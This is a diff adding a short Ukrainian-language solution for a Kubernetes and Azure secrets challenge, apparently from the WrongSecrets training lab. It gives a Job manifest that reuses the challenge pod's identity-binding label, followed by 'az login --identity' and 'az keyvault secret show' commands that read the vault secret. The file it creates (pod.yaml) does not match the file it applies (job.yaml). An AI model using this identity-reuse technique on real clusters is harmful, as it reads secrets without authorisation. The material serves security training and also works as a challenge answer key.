@@ -1,0 +1,32 @@
+Ви можете вирішити цю проблему, виконавши такі кроки:
+
+- Перевірте назву вашого сховища за допомогою `terraform output vault_name`.
+
+- Створіть новий pod-файл `pod.yaml` з наступним вмістом (замініть назву сховища на вивід з попереднього кроку):
+
+```yaml
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: wrongsecret-3
+  labels:
+    aadpodidbinding: separate-workload-pod-id
+spec:
+  template:
+    metadata:
+      name: wrongsecret3job
+      labels:
+        aadpodidbinding: separate-workload-pod-id
+    spec:
+      containers:
+      - name: az
+        image: mcr.microsoft.com/azure-cli:latest
+        command:
+            [
+              "sleep", "7200"
+            ]
+      restartPolicy: Never
+```
+- Застосуйте завдання за допомогою `kubectl apply -f job.yaml`
+
+Тепер ви можете запустити завдання в поді та виконати щось на кшталт `az login --identity --allow-no-subscriptions && az keyvault secret show --name wrongsecret-3 --vault-name wrongsecrets-vault-00000`. Зверніть увагу, що фактичне значення `wrongsecrets-vault-00000` можна знайти у стані terraform. Оскільки завдання може отримати доступ до того ж сховища, що й под секретного виклику, воно має доступ до його секретів.
